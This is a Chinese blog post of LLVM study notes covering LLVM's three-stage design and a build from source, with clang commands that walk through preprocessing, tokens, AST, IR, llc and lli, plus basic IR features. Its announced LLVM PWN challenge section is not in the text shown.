

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=dark>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="../../../../img/touxiang.png">
  <link rel="icon" href="../../../../img/touxiang.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="0P1N">
  <meta name="keywords" content="">
  
    <meta name="description" content="放暑假前接触到了LLVM和软件分析，之前看AFL相关文章也了解到AFL有LLVM模式，后来发现还有LLVM PWN，因此学一学LLVM。本文主要是配环境，理解基本概念及校赛LLVM PWN出题记录。">
<meta property="og:type" content="article">
<meta property="og:title" content="LLVM学习记录">
<meta property="og:url" content="https://lkliki.github.io/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="0P1N">
<meta property="og:description" content="放暑假前接触到了LLVM和软件分析，之前看AFL相关文章也了解到AFL有LLVM模式，后来发现还有LLVM PWN，因此学一学LLVM。本文主要是配环境，理解基本概念及校赛LLVM PWN出题记录。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lkliki.github.io/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230709194735.png">
<meta property="og:image" content="https://lkliki.github.io/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230724030043.png">
<meta property="og:image" content="https://lkliki.github.io/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230714183648.png">
<meta property="og:image" content="https://lkliki.github.io/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230724145504.png">
<meta property="og:image" content="https://lkliki.github.io/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230713210133.png">
<meta property="og:image" content="https://lkliki.github.io/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230728151311.png">
<meta property="og:image" content="https://lkliki.github.io/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230731172147.png">
<meta property="og:image" content="https://lkliki.github.io/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230731172806.png">
<meta property="og:image" content="https://lkliki.github.io/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230918001151.png">
<meta property="og:image" content="https://lkliki.github.io/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230918003125.png">
<meta property="og:image" content="https://lkliki.github.io/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230918003254.png">
<meta property="article:published_time" content="2023-10-03T04:00:00.000Z">
<meta property="article:modified_time" content="2023-12-31T05:57:00.757Z">
<meta property="article:author" content="0P1N">
<meta property="article:tag" content="LLVM">
<meta property="article:tag" content="Pass">
<meta property="article:tag" content="IR">
<meta property="article:tag" content="编译器">
<meta property="article:tag" content="Pwn">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://lkliki.github.io/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230709194735.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>LLVM学习记录 - 0P1N</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="../../../../css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="../../../../css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="../../../../css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"lkliki.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="../../../../js/utils.js" ></script>
  <script  src="../../../../js/color-schema.js" ></script>
  

  

  

  

  

  

  

  



  
<meta name="generator" content="Hexo 6.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="../../../../index.html">
      <strong>Welcome To 0P1N&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../index.html">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('../../../../img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="LLVM学习记录"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-10-03 12:00" pubdate>
          2023年10月3日 中午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          32k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          265 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">LLVM学习记录</h1>
            
            
              <div class="markdown-body">
                
                <p>放暑假前接触到了LLVM和软件分析，之前看AFL相关文章也了解到AFL有LLVM模式，后来发现还有LLVM PWN，因此学一学LLVM。本文主要是配环境，理解基本概念及校赛LLVM PWN出题记录。</p>
<span id="more"></span>

<h1 id="LLVM学习记录"><a href="#LLVM学习记录" class="headerlink" title="LLVM学习记录"></a>LLVM学习记录</h1><h2 id="LLVM介绍"><a href="#LLVM介绍" class="headerlink" title="LLVM介绍"></a>LLVM介绍</h2><p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/LLVM">wiki-llvm</a></p>
<p>LLVM由c++写成，是一个自由软件项目，一种编译器基础设施，一种编译器架构，是一个模块化可重用的编译器及工具链技术的集合，用来开发编译器前端和后端。</p>
<p>LLVM官网首页中介绍了LLVM的主要官方子项目，包括LLVM Core libraries、clang、LLDB等。</p>
<p>传统静态编译器最流行的设计是三阶段设计，其主要组件是前端、优化器和后端。前端解析源代码，检查错误，并构建特定于语言的抽象语法树（AST）来表示输入代码。AST 可以选择转换为新的表示形式以进行优化，并且优化器和后端在代码上运行。传统的编译器诸如GCC前后端耦合在一起，很难支持一门新的语言。</p>
<p>LLVM框架与传统编译器的区别在于引入了**中间代码IR(SSA静态单赋值形式)**，这是LLVM中设计的最重要的一部分。前端对于不同语言的源代码转换成统一的IR的形式，IR选择性地经过一系列pass优化，后端将IR转换成不同的机器代码，这样的设计使得LLVM格外灵活，支持一种新的编程语言，只需要实现一个新的前端。支持一种新的硬件设备，只需要实现一个新的后端。而优化阶段针对的也是统一的LLVM IR。</p>
<p>**前端(Frontend)**：词法分析-&gt;语法分析(生成AST语法树)-&gt;语义分析-&gt;中间代码(IR)。</p>
<p><strong>优化器(Optimizer)</strong>: 中间代码优化，也可以加载LLVM Pass执行自定义的优化。</p>
<p><strong>后端(Backend)</strong>: 生成汇编，生成目标文件。把IR编译成目标平台的机器代码。</p>
<p>LLVM框架图</p>
<p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230709194735.png" srcset="/img/loading.gif" lazyload alt="llvm框架"></p>
<p>LLVM前端已支持的编程语言：C、C++、ActionScript、Ada、D语言、Fortran、GLSL、Haskell、Java字节码、Objective-C、Swift、Python、Ruby、Crystal、Rust、Scala以及C#等</p>
<p>LLVM后端已支持指令集架构：x86、x86-64、ARM、MIPS、PowerPC以及RISC-V等</p>
<h2 id="llvm构建"><a href="#llvm构建" class="headerlink" title="llvm构建"></a>llvm构建</h2><p><a target="_blank" rel="noopener" href="https://llvm.org/docs/GettingStarted.html#below">官方文档</a></p>
<p>安装llvm的方式有获取官方预构建二进制文件、使用软件包管理器、从源代码构建三种，为了更好地了解llvm结构，这里选择从源代码构建，仅包含了LLVM核心库及clang子项目</p>
<p>环境及llvm版本</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ubuntu2004</span>虚拟机<br><span class="hljs-attribute">cmake</span> version <span class="hljs-number">3</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">ninja</span> <span class="hljs-number">1</span>.<span class="hljs-number">10</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">lld</span><br><span class="hljs-attribute">llvm</span> <span class="hljs-number">17</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>git<br></code></pre></td></tr></table></figure>

<p>初始位置在Home目录，构建过程：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir LLVM<br>cd LLVM<br>git clone --depth 1 https://github.com/llvm/llvm-project.git<br>cd llvm-project<br>mkdir build<br>cd build <br>touch build.sh<br>sudo ./build.sh<br></code></pre></td></tr></table></figure>

<p>build.sh的内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">cmake -G Ninja \<br>-DLLVM_ENABLE_PROJECTS=&#x27;clang&#x27; \<br>-DCMAKE_BUILD_TYPE=Release \<br>-DLLVM_TARGETS_TO_BUILD=&quot;X86&quot; \<br>-DBUILD_SHARED_LIBS=On \<br>-DLLVM_USE_LINKER=lld \  <br>../llvm<br><br>ninja <br>ninja install<br></code></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang -v<br></code></pre></td></tr></table></figure>

<p> 参数解释：</p>
<ul>
<li>-G Ninja 生成ninja构建文件，使用ninja来构建</li>
<li>-DLLVM_ENABLE_PROJECTS&#x3D;’clang’ 除了 LLVM Core 外，还需要编译的子项目</li>
<li>-DCMAKE_BUILD_TYPE&#x3D;Release cmake的release编译模式，构建时不包含调试信息和断言，占用空间少，编译更快</li>
<li>-DLLVM_TARGETS_TO_BUILD&#x3D;“X86”：默认是ALL，选择X86可节约很多编译时间</li>
<li>-DBUILD_SHARED_LIBS&#x3D;On：指定动态链接 LLVM 的库，可以节省空间</li>
<li>-DLLVM_USE_LINKER&#x3D;lld，使用lld链接器，减少编译时间</li>
</ul>
<p><strong>踩到的坑</strong></p>
<p>1.cmake版本不能太低，如果通过apt下载的cmake版本无法达到要求，则自己到官网下载</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_54348354/article/details/125697834">更新cmake参考</a></p>
<p>2.给虚拟机预留足够的磁盘空间，并且保存快照，内存设置至少4G。编译时间较长，内容较多，内存不足可能会导致虚拟机卡死，磁盘空间不足会导致编译终止，同时重启后无法正常进入图形化界面。</p>
<h2 id="llvm及clang基本使用"><a href="#llvm及clang基本使用" class="headerlink" title="llvm及clang基本使用"></a>llvm及clang基本使用</h2><p>Clang是类C语言的编译器前端，是LLVM的一个子项目,代码优化和后端由LLVM核心库提供，所以在下面的编译步骤拆解中，生成IR前都是使用clang命令，之后使用的都是llvm的其它工具</p>
<h3 id="llvm和clang的关系"><a href="#llvm和clang的关系" class="headerlink" title="llvm和clang的关系"></a>llvm和clang的关系</h3><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230724030043.png" srcset="/img/loading.gif" lazyload alt="QQ截图20230724030043"></p>
<h3 id="clang编译步骤及命令"><a href="#clang编译步骤及命令" class="headerlink" title="clang编译步骤及命令"></a>clang编译步骤及命令</h3><p>对于c++代码，使用clang++</p>
<p>对于c代码，使用clang</p>
<h4 id="1-查看编译的步骤"><a href="#1-查看编译的步骤" class="headerlink" title="1.查看编译的步骤"></a>1.查看编译的步骤</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang -ccc-print-phases hello.c<br></code></pre></td></tr></table></figure>

<p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230714183648.png" srcset="/img/loading.gif" lazyload alt="QQ截图20230714183648"></p>
<p>这里冒号后的三个部分含义分别是工具、输入、输出</p>
<p>可以看到包括了input、preprocessor、compiler、backend、assembler、linker六个阶段,事实上在compiler阶段还包括了词法分析、语法分析、语义分析(输出抽象语法树AST)、IR代码生成及优化。</p>
<p>clang中每个步骤生成的文件</p>
<p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230724145504.png" srcset="/img/loading.gif" lazyload alt="QQ截图20230724145504"></p>
<h4 id="2-编译步骤拆解"><a href="#2-编译步骤拆解" class="headerlink" title="2.编译步骤拆解"></a>2.编译步骤拆解</h4><p><strong>测试用例</strong>  hello.c</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>	cout &lt;&lt; <span class="hljs-string">&quot;Hello World!&quot;</span> &lt;&lt; endl;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<p><strong>预处理</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">clang -E hello.c</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;hello.c&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;&lt;built-in&gt;&quot;</span> 1</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;&lt;built-in&gt;&quot;</span> 3</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">384 <span class="hljs-string">&quot;&lt;built-in&gt;&quot;</span> 3</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;&lt;command line&gt;&quot;</span> 1</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;&lt;built-in&gt;&quot;</span> 2</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;hello.c&quot;</span> 2</span><br>int main()&#123;<br> printf(&quot;Hello World!\n&quot;);<br> return 0;<br>&#125;<br></code></pre></td></tr></table></figure>



<p><strong>词法分析</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">clang -E -Xclang -dump-tokens hello.c</span><br>int &#x27;int&#x27;	 [StartOfLine]	Loc=&lt;hello.c:1:1&gt;<br>identifier &#x27;main&#x27;	 [LeadingSpace]	Loc=&lt;hello.c:1:5&gt;<br>l_paren &#x27;(&#x27;		Loc=&lt;hello.c:1:9&gt;<br>r_paren &#x27;)&#x27;		Loc=&lt;hello.c:1:10&gt;<br>l_brace &#x27;&#123;&#x27;		Loc=&lt;hello.c:1:11&gt;<br>identifier &#x27;printf&#x27;	 [StartOfLine] [LeadingSpace]	Loc=&lt;hello.c:2:2&gt;<br>l_paren &#x27;(&#x27;		Loc=&lt;hello.c:2:8&gt;<br>string_literal &#x27;&quot;Hello World!\n&quot;&#x27;		Loc=&lt;hello.c:2:9&gt;<br>r_paren &#x27;)&#x27;		Loc=&lt;hello.c:2:25&gt;<br>semi &#x27;;&#x27;		Loc=&lt;hello.c:2:26&gt;<br>return &#x27;return&#x27;	 [StartOfLine] [LeadingSpace]	Loc=&lt;hello.c:3:2&gt;<br>numeric_constant &#x27;0&#x27;	 [LeadingSpace]	Loc=&lt;hello.c:3:9&gt;<br>semi &#x27;;&#x27;		Loc=&lt;hello.c:3:10&gt;<br>r_brace &#x27;&#125;&#x27;	 [StartOfLine]	Loc=&lt;hello.c:4:1&gt;<br>eof &#x27;&#x27;		Loc=&lt;hello.c:4:2&gt;<br></code></pre></td></tr></table></figure>



<p><strong>语法分析与语义分析生成语法树AST</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang -fsyntax-only -Xclang -ast-dump hello.c<br><span class="hljs-meta prompt_">#</span><span class="language-bash">代码量过大</span><br></code></pre></td></tr></table></figure>



<p><strong>生成LLVM IR</strong></p>
<p>LLVM IR在磁盘中有两种形式：文本格式,拓展名.ll;bitcode二进制格式，拓展名.bc</p>
<p>文本格式</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang -S -emit-llvm hello.c<br></code></pre></td></tr></table></figure>

<p>二进制格式</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang -c -emit-llvm hello.c<br></code></pre></td></tr></table></figure>

<p>llvm提供了两种格式相互转换的工具：<strong>汇编器llvm-as</strong>和反汇编器llvm-dis</p>
<p>llvm-as:将.ll转换成.bc</p>
<p>llvm-dis:将.bc转换成.ll</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">llvm-as hello.ll -o hello.bc<br>llvm-dis hello.bc -o hello.ll<br></code></pre></td></tr></table></figure>



<p><strong>使用lli工具执行LLVM bitcode格式程序(可选)</strong></p>
<p>注：LLI <em>不是</em>模拟器。它不会执行不同架构的 IR 并且它只能解释（或 JIT 编译）主机体系结构。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">lli hello.bc</span><br>Hello World!<br></code></pre></td></tr></table></figure>



<p><strong>使用llc工具生成汇编代码及目标文件</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">llc hello.bc -o hello.s<br></code></pre></td></tr></table></figure>

<p>生成的汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs assembly">	.text<br>	.file	&quot;hello.c&quot;<br>	.globl	main                            # -- Begin function main<br>	.p2align	4, 0x90<br>	.type	main,@function<br>main:                                   # @main<br>	.cfi_startproc<br># %bb.0:<br>	pushq	%rbp<br>	.cfi_def_cfa_offset 16<br>	.cfi_offset %rbp, -16<br>	movq	%rsp, %rbp<br>	.cfi_def_cfa_register %rbp<br>	subq	$16, %rsp<br>	movl	$0, -4(%rbp)<br>	movabsq	$.L.str, %rdi<br>	movb	$0, %al<br>	callq	printf@PLT<br>	xorl	%eax, %eax<br>	addq	$16, %rsp<br>	popq	%rbp<br>	.cfi_def_cfa %rsp, 8<br>	retq<br>.Lfunc_end0:<br>	.size	main, .Lfunc_end0-main<br>	.cfi_endproc<br>                                        # -- End function<br>	.type	.L.str,@object                  # @.str<br>	.section	.rodata.str1.1,&quot;aMS&quot;,@progbits,1<br>.L.str:<br>	.asciz	&quot;Hello World!\n&quot;<br>	.size	.L.str, 14<br><br>	.ident	&quot;clang version 17.0.0 (https://github.com/llvm/llvm-project.git b16372c5fc65a6a7c14c19f01b17ac15a964d21f)&quot;<br>	.section	&quot;.note.GNU-stack&quot;,&quot;&quot;,@progbits<br></code></pre></td></tr></table></figure>

<p>生成目标文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">llc -filetype=obj hello.bc -o hello.o<br></code></pre></td></tr></table></figure>

<p>接下来进行链接即可生成可执行文件，链接器用ld和llvm的子项目lld都可以</p>
<h3 id="部分指令解释"><a href="#部分指令解释" class="headerlink" title="部分指令解释"></a>部分指令解释</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">-ccc-print-phases<br>查看编译的步骤<br><br>-E, --preprocess<br>Only run the preprocessor<br>只允许预处理步骤<br>-S, --assemble<br>Only run preprocess and compilation steps<br>只运行预处理和编译步骤<br><br>-c, --compile<br>Only run preprocess, compile, and assemble steps<br>只运行预处理,编译和汇编步骤<br><br>-emit-llvm<br>使用汇编程序和目标文件的 LLVM 表示，可查看IR<br><br>-fsyntax-only<br>运行预处理器、解析器和语义分析阶段<br><br>-Xclang &lt;arg&gt;<br>传递 &lt;arg&gt; 到 clang -cc1<br><br>-dump-tokens<br>运行预处理器,拆分内部代码段为各种token、<br><br>-ast-dump<br>构建抽象语法树AST,然后对其进行拆解和调试<br></code></pre></td></tr></table></figure>

<p>更多细节查看</p>
<p><a target="_blank" rel="noopener" href="https://clang.llvm.org/docs/ClangCommandLineReference.html">Clang 命令行参数参考</a></p>
<p><a target="_blank" rel="noopener" href="https://llvm.org/docs/CommandGuide/index.html">llvm命令指南</a></p>
<h2 id="LLVM-IR"><a href="#LLVM-IR" class="headerlink" title="LLVM IR"></a>LLVM IR</h2><p><a target="_blank" rel="noopener" href="https://llvm.org/docs/LangRef.html#abstract">llvm ir参考手册</a></p>
<p>LLVM的核心是<strong>IR语言</strong>（Intermediate Representation），一种类似汇编的底层语言。</p>
<p>IR是一种强类型的精简指令集（Reduced Instruction Set Computing，RISC），并对目标指令集进行了抽象。</p>
<p>LLVM IR有3种表示形式：</p>
<p>text：便于阅读的文本格式。扩展名为.ll<br>bitcode：二进制格式。扩展名为.bc<br>memory：内存格式</p>
<p>LLVM IR 的特点如下：</p>
<ul>
<li>采用静态单一赋值（Static Single Assignment，SSA），即每个值只有一个定义它的赋值操作</li>
<li>代码被组织为三地址指令（Three-address Instructions）</li>
<li>有无限多个寄存器</li>
</ul>
